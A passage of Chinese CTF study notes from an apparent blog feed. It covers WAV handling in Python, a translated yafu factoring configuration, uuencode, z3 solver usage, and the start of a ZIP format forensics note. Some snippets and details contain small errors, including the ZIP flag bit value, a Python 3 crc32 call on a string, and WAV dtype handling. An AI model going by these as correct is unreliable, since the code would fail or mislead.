<p>这里使用 Python3 对 wav 文件进行处理。</p>
<p>在 Python3 中自带一个 <code>wave</code> 模块支持对 wav
格式的音频数据进行处理，结合 <code>numpy</code> 可以自由操作所有 wav
的波形数据。</p>
<p>常用的操作有：</p>
<table>
<colgroup>
<col style="width: 37%">
<col style="width: 62%">
</colgroup>
<thead>
<tr class="header">
<th>函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>wave.open(filename, "r")</code></td>
<td>打开一个音频文件，返回 <code>Wave_read</code> 对象</td>
</tr>
<tr class="even">
<td><code>Wave_read.close()</code></td>
<td>关闭一个 <code>Wave_read</code> 对象</td>
</tr>
<tr class="odd">
<td><code>Wave_read.getnchannels()</code></td>
<td>返回声道数量，1为单声道，2为立体声</td>
</tr>
<tr class="even">
<td><code>Wave_read.getsampwidth()</code></td>
<td>返回采样位数</td>
</tr>
<tr class="odd">
<td><code>Wave_read.getframerate()</code></td>
<td>返回采样频率</td>
</tr>
<tr class="even">
<td><code>Wave_read.getnframes()</code></td>
<td>返回音频总帧数</td>
</tr>
<tr class="odd">
<td><code>Wave_read.readframes(n)</code></td>
<td>读取 n 帧波形数据，如果参数为 -1 则读取所有</td>
</tr>
</tbody>
</table>
<p>将波形数据转化为成 <code>ndarray</code> 的示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">f = wave.<span class="built_in">open</span>(<span class="string">&quot;attachment.wav&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.readframes(-<span class="number">1</span>)</span><br><span class="line">data = np.frombuffer(data, dtype = [np.uint8, np.uint16, np.uint32][f.getsampwidth() // <span class="number">2</span>])</span><br><span class="line">data.reshape(-<span class="number">1</span>, f.getnchannels())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<h2 id="python3soundfile">python3&amp;soundfile</h2>
<p>但这里更推荐使用第三方库
<code>soundfile</code>，可以更轻松的将音频数据读取并转换为
<code>ndarray</code>，示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data, samplerate = sf.read(<span class="string">&quot;attachment.wav&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<p>其中，<code>samplerate</code> 是音频的采样率。</p>
<p>但默认读取类型是 <code>float</code>，如果觉得不好看，可以通过
<code>dtype</code> 参数控制输出的 <code>numpy</code> 数组的
<code>dtype</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data, samplerate = sf.read(<span class="string">&quot;attachment.wav&quot;</span>, dtype = np.int16)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<p>同时如果是多声道的音频文件，它将转换出多个 <code>ndarray</code>
数组来保存不同声道的数据。</p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>yafu质因数分解工具的笔记</title>
    <url>//yafu-note.html</url>
    <content><![CDATA[<h1 id="yafu">yafu</h1>
<h2 id="简述">简述</h2>
<p><code>yafu</code>
是数学爱好者们所写的一个关于大整数分解的项目，在现在的公钥加密方案中，大整数分解（质因数分解）十分重要，故
<code>yafu</code> 通常被用于快速分解大整数（例如分解 RSA 中的
<code>n</code>）。</p>
<p><code>yafu</code>
的成功离不开其他开源代码，它使用目前来说最先进的自动化代码，在智能和自适应方法中结合分解算法，最小化分解时间。</p>
<p>同时需要注意的是，<code>yafu</code>
是纯命令行驱动的，可以使用交互输入模式。</p>
<h2 id="安装">安装</h2>
<p>可以在 <a href="https://github.com/bbuhrow/yafu">GitHub
主页</a>上下载已经构建好的版本（或者是自行编译），也可以在 <a href="https://sourceforge.net/projects/yafu/">SourceForge</a>
上下载已经打包好的版本（解压即可）。</p>
<p>仅需要对应的二进制即可运行（一般使用 x64
版本），但需要注意的是，<code>yafu</code>
所需的依赖文件是要与二进制文件在同一目录下的。</p>
<p><code>yafu</code> 自身是通过支持库 <code>msieve</code>
运行分解算法的，但不支持特殊的 NFS 算法。</p>
<h2 id="number-field-sievenfs安装">Number Field Sieve（NFS）安装</h2>
<blockquote>
<p>不需要理会该节，仅是 README 的必要翻译。</p>
</blockquote>
<p>Number Field
Sieve，数域筛法，是最快的、效率最高的（渐近意义下）整数分解方法，用于解决
IFP 和 DLP 问题。</p>
<p>想让 <code>yafu</code> 使用 NFS 算法进行质因数分解，可以直接在 <a href="https://sourceforge.net/projects/ggnfs/">https://sourceforge.net/projects/ggnfs/</a>
该网站中下载对应版本的 <code>GGNFS</code> 二进制文件的压缩包，再自解压到
<code>yafu</code> 所在目录（如 <code>./ggnfs-bin</code> 下）。</p>
<p>随后在 <code>yafu.ini</code> 中填入
<code>ggnfs_dir=./ggnfs-bin/</code>（注意变量名不能冲突）。</p>
<h2 id="yafu.ini">yafu.ini</h2>
<p>该文件是 <code>yafu</code> 运行的初始化文件。</p>
<blockquote>
<p>需要注意，<code>yafu</code> 的 <code>input_size</code>
以十进制算。例如 1903387770 是 10 位数。</p>
</blockquote>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">%%% 常规选项 %%%</span><br><span class="line"></span><br><span class="line">% 多线程算法的指定线程数</span><br><span class="line"><span class="attr">threads</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">% 米勒-拉宾素性检验的证人(witnesses)数量</span><br><span class="line"><span class="attr">nprp</span>=<span class="number">7</span></span><br><span class="line"></span><br><span class="line">% 信息输出等级设为1，默认为0</span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">% 关闭信息输出</span><br><span class="line">silent</span><br><span class="line"></span><br><span class="line">% 跳过启动时的时钟测试</span><br><span class="line">no_clk_test</span><br><span class="line"></span><br><span class="line">% 运行给定脚本</span><br><span class="line"><span class="attr">script</span>=<span class="string">&quot;my_script&quot;</span></span><br><span class="line"></span><br><span class="line">% 指定会话日志(会话日志记录运行的命令，随机数种子，系统信息和一些启动项)</span><br><span class="line"><span class="attr">session</span>=<span class="string">&quot;session.log&quot;</span></span><br><span class="line"></span><br><span class="line">% 使用给定文件名的数字运行给定命令</span><br><span class="line"><span class="attr">batchfile</span>=<span class="string">&quot;my_batch_file&quot;</span></span><br><span class="line"></span><br><span class="line">% 指定随机数种子</span><br><span class="line"><span class="attr">seed</span>=<span class="number">1903387770</span></span><br><span class="line"></span><br><span class="line">% 启动时打印详细处理器信息</span><br><span class="line">vproc</span><br><span class="line"></span><br><span class="line">% 指定记录分解信息的日志文件</span><br><span class="line"><span class="attr">logfile</span>=<span class="string">&quot;factor.log&quot;</span></span><br><span class="line"></span><br><span class="line">% 将yafu设置为空闲优先级</span><br><span class="line">p</span><br><span class="line"></span><br><span class="line">% 重复给定的命令N次</span><br><span class="line"><span class="attr">repeat</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%%% factor选项 %%%</span><br><span class="line"></span><br><span class="line">% 在运行NFS之前，ECM是否工作到(pretest_ratio * input_size)位数</span><br><span class="line"><span class="attr">pretest_ratio</span>=<span class="number">0.25</span></span><br><span class="line"></span><br><span class="line">% GNFS/SIQS的交叉点(crossover)，以十进制数</span><br><span class="line"><span class="attr">xover</span>=<span class="number">100</span></span><br><span class="line"></span><br><span class="line">% SNFS/SIQS的交叉点(crossover)，以十进制数</span><br><span class="line"><span class="attr">snfs_xover</span>=<span class="number">85</span></span><br><span class="line"></span><br><span class="line">% 设置(ECM)预测试方案(pretesting plan), 例如<span class="attr">plan</span>=light.  </span><br><span class="line">% 以下是有效的选项与他们的比例:</span><br><span class="line">% light (2/9)</span><br><span class="line">% deep (1/3)</span><br><span class="line">% normal (4/13)</span><br><span class="line">% none (0)</span><br><span class="line">% custom (pretest_ratio)</span><br><span class="line"><span class="attr">plan</span>=normal</span><br><span class="line"></span><br><span class="line">% 仅预测试(rho, p-1, ecm)输入值(即不使用NFS或SIQS)，可选择最大深度</span><br><span class="line">pretest</span><br><span class="line"></span><br><span class="line">% 指定在输入上执行ECM的工作量</span><br><span class="line"><span class="attr">work</span>=<span class="number">25</span></span><br><span class="line"></span><br><span class="line">% 指定factor期间发现的素数输出文件</span><br><span class="line"><span class="attr">op</span>=<span class="string">&quot;pfile.dat&quot;</span></span><br><span class="line"></span><br><span class="line">% 指定factor期间发现的因子输出文件</span><br><span class="line"><span class="attr">of</span>=<span class="string">&quot;factored.dat&quot;</span></span><br><span class="line"></span><br><span class="line">% 指定factor期间未分解数的输出文件</span><br><span class="line"><span class="attr">ou</span>=<span class="string">&quot;unfactored.dat&quot;</span></span><br><span class="line"></span><br><span class="line">% 对输入值不执行ECM算法</span><br><span class="line">noecm</span><br><span class="line"></span><br><span class="line">% 在找到一个因子后就停止</span><br><span class="line">one</span><br><span class="line"></span><br><span class="line">% 设置十进制数位数低于N就使用APR-CL算法证明是素数</span><br><span class="line"><span class="attr">aprcl_p</span>=<span class="number">500</span></span><br><span class="line"></span><br><span class="line">% 设置十进制数位数高于N就使用APR-CL算法证明是素数，启用额外的信息</span><br><span class="line"><span class="attr">aprcl_d</span>=<span class="number">200</span></span><br><span class="line"></span><br><span class="line">%%% QS选项 %%%</span><br><span class="line">% 使用 double-large-prime variation</span><br><span class="line">forceDLP</span><br><span class="line"></span><br><span class="line">% 使用 triple-large-prime variation，注意其他选项，该选项可能不会被优化</span><br><span class="line">forceTLP</span><br><span class="line"></span><br><span class="line">% 设置小素数变化阈值</span><br><span class="line"><span class="attr">siqsTFSm</span> =<span class="number">18</span></span><br><span class="line"></span><br><span class="line">% 指定siqs保存文件名</span><br><span class="line">% <span class="attr">qssave</span>=<span class="string">&quot;siqs.dat&quot;</span></span><br><span class="line"></span><br><span class="line">% 设置因子基数的大小（要使用的素数）</span><br><span class="line">sqsB</span><br><span class="line"></span><br><span class="line">% 设置大于此大小的试分解截止-筛位置(以位为单位)，报告给试验因式分解例程</span><br><span class="line">sqsTF</span><br><span class="line"></span><br><span class="line">% 设置筛块数（每边）</span><br><span class="line">siqsNB</span><br><span class="line"></span><br><span class="line">% 将大素数界限设置为最大因子基素数的乘数</span><br><span class="line">sqsM</span><br><span class="line"></span><br><span class="line">% 不执行小素数变化阈值的优化</span><br><span class="line">noopt</span><br><span class="line"></span><br><span class="line">% 设置一个阈值，低于该阈值 siqs 将不使用保存文件（所有关系都是在内存中处理）</span><br><span class="line"><span class="attr">inmem</span>=<span class="number">70</span></span><br><span class="line"></span><br><span class="line">%%% NFS选项 %%%</span><br><span class="line">% 运行实验性 cado-nfs+msieve NFS</span><br><span class="line">cadoMsieve</span><br><span class="line"></span><br><span class="line">% 包含 CADO-NFS 文件的目录的相对或绝对路径</span><br><span class="line">% 注意：需要在路径末尾添加/或\</span><br><span class="line"><span class="attr">cado_dir</span> =/home/nyancat/工具/cado-nfs/</span><br><span class="line"></span><br><span class="line">% 指定 convert_poly 可执行文件的路径</span><br><span class="line">% 你可以通过在 CADO-NFS 目录下运行“ make convert_poly ”来构建它</span><br><span class="line">% 它将在 build/*/misc/convert_poly(.exe) 下</span><br><span class="line"><span class="attr">convert_poly_path</span> =/home/nyancat/Tools/cado-nfs/build/NyanCatCBLFS.mpi/misc/convert_poly</span><br><span class="line"></span><br><span class="line">% 包含 ggnfs-lasieve4I* 可执行文件的目录的相对或绝对路径。</span><br><span class="line">% 没有这些 yafu 将不会使用 NFS</span><br><span class="line"><span class="attr">ggnfs_dir</span> =..\..\ggnfs-bin\x64\</span><br><span class="line">% <span class="attr">ggnfs_dir</span> =../../ggnfs-bin/</span><br><span class="line"></span><br><span class="line">% 逗号分隔的 poly 文件列表以测试sieve</span><br><span class="line">testsieve</span><br><span class="line"></span><br><span class="line">% 如果过滤尝试失败，则收集新关系的百分比去生成矩阵</span><br><span class="line"><span class="attr">filt_bump</span>=<span class="number">5</span></span><br><span class="line"></span><br><span class="line">% 恢复矩阵求解</span><br><span class="line">ncr</span><br><span class="line"></span><br><span class="line">% 强制使用 gnfs（相对于 snfs）</span><br><span class="line">gnfs</span><br><span class="line"></span><br><span class="line">% 矩阵求解时使用指定线程数（可以是不同于常规选项的“threads”选项）</span><br><span class="line"><span class="attr">lathreads</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">% 重新启动 NFS 作业（当存在现有 nfs.dat 文件时，无论输入如何）</span><br><span class="line">R</span><br><span class="line"></span><br><span class="line">% 在搜索多项式前导系数时为每个线程设置一个批量大小</span><br><span class="line"><span class="attr">pbatch</span>=<span class="number">250</span></span><br><span class="line"></span><br><span class="line">% 使用代数方格筛分</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">% 使用有理方格筛</span><br><span class="line">r</span><br><span class="line"></span><br><span class="line">%%% ECM选项 %%%</span><br><span class="line">% 设置 ECM 的 B1 水平。</span><br><span class="line"><span class="attr">B1ecm</span> =<span class="number">11000</span></span><br><span class="line"></span><br><span class="line">% 设置 ECM 的 B2 水平。  </span><br><span class="line">% 仅当您想要默认值以外的其他内容时才需要，默认当前 B1 的百分比。</span><br><span class="line">% <span class="attr">B2ecm</span> =<span class="number">1100000</span></span><br><span class="line"></span><br><span class="line">% 指定 ECM 可执行文件的路径</span><br><span class="line"><span class="attr">ecm_path</span> =..\gmp-ecm\bin\x64\Release\ecm.exe</span><br><span class="line">% <span class="attr">ecm_path</span> =../gmp-ecm/install/mingw/bin/ecm.exe</span><br><span class="line">% <span class="attr">ecm_path</span> =../gmp-ecm/bin/ecm</span><br><span class="line"></span><br><span class="line">%%% P-1 选项 %%%</span><br><span class="line">% 为 P-1 设置 B1 级别。</span><br><span class="line">% <span class="attr">B1pm1</span> =<span class="number">100000</span></span><br><span class="line"></span><br><span class="line">% 为 P-1 设置 B2 级别。  </span><br><span class="line">% 仅当您想要默认值以外的其他内容时才需要，默认当前 B1 的百分比。</span><br><span class="line">% <span class="attr">B2pm1</span> =<span class="number">10000000</span></span><br><span class="line"></span><br><span class="line">%%% P+1 选项 %%%</span><br><span class="line">% 为 P+1 设置 B1 级别。</span><br><span class="line"><span class="attr">B1pm1</span> =<span class="number">20000</span></span><br><span class="line"></span><br><span class="line">% 为 P+1 设置 B2 级别。  </span><br><span class="line">% 仅当您想要默认值以外的其他内容时才需要，默认当前 B1 的百分比。</span><br><span class="line">% <span class="attr">B2pm1</span> =<span class="number">2000000</span></span><br><span class="line"></span><br><span class="line">%%% Brent-Pollard Rho 选项 %%%</span><br><span class="line"><span class="attr">rhomax</span>=<span class="number">200</span></span><br><span class="line"></span><br><span class="line">%%% 费马选项 %%%</span><br><span class="line"><span class="attr">fmtmax</span>=<span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>crypto</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>uuencode 笔记</title>
    <url>//uuencode-note.html</url>
    <content><![CDATA[<h1 id="uuencode-原理">UUEncode 原理</h1>
<p>Uuencode是二进制信息和文字信息之间的转换编码，也就是机器和人眼识读的转换。Uuencode编码方案常见于电子邮件信息的传输，目前已被多用途互联网邮件扩展（MIME）大量取代。</p>
<p>Uuencode将输入文字以每三个字节为单位进行编码，如此重复进行。如果最后剩下的文字少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6-bit为单位分为4个群组，每个群组以十进制来表示所出现的数值只会落在0到63之间。将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白...95-底线）的范围之中。</p>
<p>Uuencode编码每60个将输出为独立的一行（相当于45个输入字节），每行的开头会加上长度字符，除了最后一行之外，长度字符都应该是“M”这个ASCII字符（77=32+45），最后一行的长度字符为32+剩下的字节数目这个ASCII字符。</p>
<p>Uuencode编码与base64编码类似，但base64将0~63之间的数字通过查表换字符，而Uuencode编码是直接将这个数字加上32转换为可打印字符。</p>
<h1 id="c-实现">C++ 实现</h1>
<h2 id="加密---encode">加密 - Encode</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">encode</span><span class="params">(<span class="type">const</span> string&amp; plain)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;有机会再实现&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解密---decode">解密 - Decode</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">decode</span><span class="params">(<span class="type">const</span> string&amp; code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;有机会再实现&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="python-实现">Python 实现</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 uuencode 将 in_file 文件编码为 out_file 文件。</span></span><br><span class="line"><span class="comment"># 经过 uuencoded 编码的文件将具有指定 name 和 mode 作为解码该文件默认结果的标头。</span></span><br><span class="line"><span class="comment"># 默认值会相应地从 in_file 或 &#x27;-&#x27; 以及 0o666 中提取。</span></span><br><span class="line"><span class="comment"># 如果 backtick 为真值，零会用 &#x27;`&#x27; 而不是空格来表示。</span></span><br><span class="line">uu.encode(in_file, out_file, mode=<span class="literal">None</span>, *, backtick=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用此函数会解码 uuencod 编码的 in_file 文件并将结果放入 out_file 文件。</span></span><br><span class="line"><span class="comment"># 如果 out_file 是一个路径名称，mode 会在必须创建文件时用于设置权限位。</span></span><br><span class="line"><span class="comment"># out_file 和 mode 的默认值会从 uuencode 标头中提取。</span></span><br><span class="line"><span class="comment"># 但是，如果标头中指定的文件已存在，则会引发 uu.Error。</span></span><br><span class="line">uu.decode(in_file, out_file=<span class="literal">None</span>, mode=<span class="literal">None</span>, quiet=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<h1 id="在线网站">在线网站</h1>
<ul>
<li>https://www.qqxiuzi.cn/bianma/uuencode.php</li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>uuencode</tag>
      </tags>
  </entry>
  <entry>
    <title>z3 使用笔记</title>
    <url>//z3-note.html</url>
    <content><![CDATA[<h1 id="z3-简介">z3 简介</h1>
<p>z3 是 Microsoft Research
开发的一个定理证明器，支持位向量、布尔值、数组、浮点数、字符串和其他数据类型，可以用来自动化证明定理、线性规划求解和方程求解。</p>
<p>但方程求解效率过低，不建议使用 z3 求解方程 (少量未知数可以使用)。</p>
<h1 id="z3-安装">z3 安装</h1>
<p>可以使用 pip 进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure>
<p>若出现 pip 安装超时或安装失败的情况，请在
https://github.com/Z3Prover/z3/releases 中下载 <code>release</code>
版本包。</p>
<p>这里以 Windows 为例，下载 <code>z3-x64-win.zip</code>
后解压在合适的目录中。</p>
<p>然后将解压目录下的 <code>./bin</code> 目录添加进入环境变量
<code>Path</code> ；解压目录下的 <code>./bin/python</code>
添加进入环境变量 <code>PYTHONPATH</code> 即可。</p>
<h1 id="z3-使用">z3 使用</h1>
<h2 id="求解过程">求解过程</h2>
<ol type="1">
<li>定义若干某种类型的未知数</li>
<li>创建求解器 <code>Solver()</code></li>
<li>添加约束条件 <code>add()</code></li>
<li>进行检查问题是否有解 <code>check()</code></li>
<li>创建解决问题后的模型对象 <code>model()</code></li>
<li>得到解</li>
</ol>
<h2 id="定义若干某种类型的未知数">定义若干某种类型的未知数</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)				<span class="comment"># 创建数据类型为整数的未知数</span></span><br><span class="line">y = Real(<span class="string">&#x27;y&#x27;</span>)				<span class="comment"># 创建数据类型为实数的未知数</span></span><br><span class="line">z = BitVec(<span class="string">&#x27;z&#x27;</span>, <span class="number">64</span>)			<span class="comment"># 创建数据类型为 64 位向量的未知数 (通常用于求解位运算问题)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建数据类型为整数的三个未知数</span></span><br><span class="line"><span class="comment"># 同理存在 Reals, BitVecs 等</span></span><br><span class="line">x, y, z = Ints(<span class="string">&#x27;x y z&#x27;</span>)</span><br><span class="line"><span class="comment"># 以上 &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27; 均为 z3 内部的未知数名，可更改，但不能重复</span></span><br></pre></td></tr></table></figure>
<h2 id="二元一次方程求解">二元一次方程求解</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义若干某种类型的未知数</span></span><br><span class="line">x, y = Ints(<span class="string">&#x27;x y&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建求解器</span></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="comment"># 添加约束条件</span></span><br><span class="line">s.add(x+<span class="number">3</span>*y == <span class="number">4</span>)</span><br><span class="line">s.add(<span class="number">3</span>*x+y == <span class="number">4</span>)</span><br><span class="line"><span class="comment"># 以上两行代码可以归并成一行代码 s.add(x+3*y == 4, 3*x+y == 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否问题有解，有解则返回 sat ；无解则返回 unsat</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 创建解决问题后的模型对象</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="comment"># 获得 x 未知数对应的模型值</span></span><br><span class="line">    varX = m[x]</span><br><span class="line">    <span class="comment"># 输出</span></span><br><span class="line">    <span class="built_in">print</span>(varX)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;unsat!&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="位运算求解">位运算求解</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义若干某种类型的未知数</span></span><br><span class="line">x = BitVec(<span class="string">&#x27;x&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="comment"># 创建求解器</span></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="comment"># 添加约束条件</span></span><br><span class="line">s.add(x ^ <span class="number">0xff</span> == <span class="number">0x12</span>)</span><br><span class="line"><span class="comment"># 判断是否问题有解，有解则返回 sat ；无解则返回 unsat</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 创建解决问题后的模型对象</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="comment"># 获得 x 未知数对应的模型值</span></span><br><span class="line">    varX = m[x]</span><br><span class="line">    <span class="comment"># 输出</span></span><br><span class="line">    <span class="built_in">print</span>(varX)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;unsat!&quot;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>python</tag>
        <tag>z3</tag>
      </tags>
  </entry>
  <entry>
    <title>zip压缩包取证笔记</title>
    <url>//zip-crack-note.html</url>
    <content><![CDATA[<h1 id="zip-格式详解">ZIP 格式详解</h1>
<h2 id="简述">简述</h2>
<p>ZIP 文件格式是一种数据压缩和文档储存的文件格式，原名
Deflate（压缩算法），现通常以 <code>.zip</code>
后缀表示该类压缩文件。</p>
<p>目前来说 ZIP
是一种主流的压缩方式，但存在许多缺陷，例如明文攻击、字典攻击和暴力破解等。</p>
<p>可以使用 Bandizip 等多种主流工具进行 Deflate 压缩。</p>
<h2 id="数据">数据</h2>
<p>ZIP 压缩包的数据以块为单位，常见的有以下几个块：</p>
<h3 id="文件数据块zipfilerecord">文件数据块（<code>ZIPFILERECORD</code>）</h3>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 24%">
<col style="width: 52%">
</colgroup>
<thead>
<tr class="header">
<th>名字</th>
<th>字节</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Signature</code></td>
<td>4</td>
<td>值为<code>504B0304</code>，是 ZIP 特有签名</td>
</tr>
<tr class="even">
<td><code>Version</code></td>
<td>2</td>
<td>解压文件所需版本</td>
</tr>
<tr class="odd">
<td><code>Flags</code></td>
<td>2</td>
<td>通用标志位</td>
</tr>
<tr class="even">
<td><code>Compression</code></td>
<td>2</td>
<td>压缩方式</td>
</tr>
<tr class="odd">
<td><code>FileTime</code></td>
<td>2</td>
<td>被压缩文件最后修改时间（<code>DOSTIME</code>类型）</td>
</tr>
<tr class="even">
<td><code>FileDate</code></td>
<td>2</td>
<td>被压缩文件最后修改日期（<code>DOSDATE</code>类型）</td>
</tr>
<tr class="odd">
<td><code>Crc</code></td>
<td>4</td>
<td>CRC 校验码</td>
</tr>
<tr class="even">
<td><code>CompressedSize</code></td>
<td>4</td>
<td>压缩后大小（同时也是 <code>Data</code> 块大小）</td>
</tr>
<tr class="odd">
<td><code>UncompressedSize</code></td>
<td>4</td>
<td>文件原始大小（即解压后的大小）</td>
</tr>
<tr class="even">
<td><code>FileNameLength</code></td>
<td>2</td>
<td>被压缩文件名长度</td>
</tr>
<tr class="odd">
<td><code>ExtraFieldLength</code></td>
<td>2</td>
<td>扩展区长度</td>
</tr>
<tr class="even">
<td><code>FileName</code></td>
<td><code>FileNameLength</code></td>
<td>被压缩文件名</td>
</tr>
<tr class="odd">
<td><code>Data</code></td>
<td><code>CompressedSize</code></td>
<td>被压缩文件数据</td>
</tr>
<tr class="even">
<td><code>ExtData</code></td>
<td><code>ExtraFieldLength</code></td>
<td>扩展区数据</td>
</tr>
</tbody>
</table>
<p>其中默认压缩版本一般为 <code>20</code>，即 <code>Deflate</code>
压缩方式。</p>
<h4 id="version"><code>Version</code></h4>
<p><strong>当前最低功能版本定义如下</strong>：（压缩包记录的解压版本都是需要版本<em>10，比如：2.0
</em> 10 = 20）</p>
<ul>
<li><p>1.0 - 默认值</p></li>
<li><p>1.1 - 文件是卷标</p></li>
<li><p>2.0 - 文件是一个文件夹（目录）</p></li>
<li><p>2.0 - 使用 Deflate 压缩来压缩文件</p></li>
<li><p>2.0 - 使用传统的 PKWARE 加密对文件进行加密</p></li>
<li><p>2.1 - 使用 Deflate64™ 压缩文件</p></li>
<li><p>2.5 - 使用 PKWARE DCL Implode 压缩文件</p></li>
<li><p>2.7 - 文件是补丁数据集</p></li>
<li><p>4.5 - 文件使用 ZIP64 格式扩展</p></li>
<li><p>4.6 - 使用 BZIP2 压缩文件压缩</p></li>
<li><p>5.0 - 文件使用 DES 加密</p></li>
<li><p>5.0 - 文件使用 3DES 加密</p></li>
<li><p>5.0 - 使用原始 RC2 加密对文件进行加密</p></li>
<li><p>5.0 - 使用 RC4 加密对文件进行加密</p></li>
<li><p>5.1 - 文件使用 AES 加密进行加密</p></li>
<li><p>5.1 - 使用更正的 RC2 加密对文件进行加密</p></li>
<li><p>5.2 - 使用更正的 RC2-64 加密对文件进行加密</p></li>
<li><p>6.1 - 使用非 OAEP 密钥包装对文件进行加密</p></li>
<li><p>6.2 - 中央目录加密</p></li>
</ul>
<h4 id="flags"><code>Flags</code></h4>
<p>当<strong>第0位为1时</strong>（即<code>0x1</code>），表示<strong>文件被加密</strong>；当<strong>第3位为1时</strong>（即<code>0x3</code>），表示<strong>有数据描述部分</strong>。</p>
<p>有时虽然第3位为1，但仍然本地头存有真实值（理论上文件头内的描述应该被设为0，然后将描述放在<strong>数据描述部分</strong>）。</p>
<h4 id="compression"><code>Compression</code></h4>
<p>不同的值代表不同的压缩方式，默认为 <code>8</code>，即
<code>Deflate</code> 压缩。</p>
<ul>
<li>0 - The file is stored (no compression)</li>
<li>1 - The file is Shrunk</li>
<li>2 - The file is Reduced with compression factor 1</li>
<li>3 - The file is Reduced with compression factor 2</li>
<li>4 - The file is Reduced with compression factor 3</li>
<li>5 - The file is Reduced with compression factor 4</li>
<li>6 - The file is Imploded</li>
<li>7 - Reserved for Tokenizing compression algorithm</li>
<li>8 - The file is Deflated</li>
<li>9 - Enhanced Deflating using Deflate64™</li>
<li>10 - PKWARE Data Compression Library Imploding</li>
<li>11 - Reserved by PKWARE</li>
<li>12 - File is compressed using BZIP2 algorithm</li>
</ul>
<h4 id="crc"><code>Crc</code></h4>
<p>该 CRC 校验码为文件未压缩时的 <code>CRC-32</code> 校验码，在 Python
中可借助 <code>binascii</code> 模块进行计算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">crc = binascii.crc32(<span class="string">&#x27;hello&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="文件目录块zipdirentry">文件目录块（<code>ZIPDIRENTRY</code>）</h3>
<p>一个数据块就对应一个目录块，其中
<code>Flags</code>、<code>Compression</code>、<code>FileTime</code>、<code>FileDate</code>、<code>Crc</code>、<code>CompressedSize</code>、<code>UncompressedSize</code>、<code>FileNameLength</code>、<code>ExtraFieldLength</code>
与数据块同值。</p>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 22%">
<col style="width: 53%">
</colgroup>
<thead>
<tr class="header">
<th>名字</th>
<th>字节</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Signature</code></td>
<td>4</td>
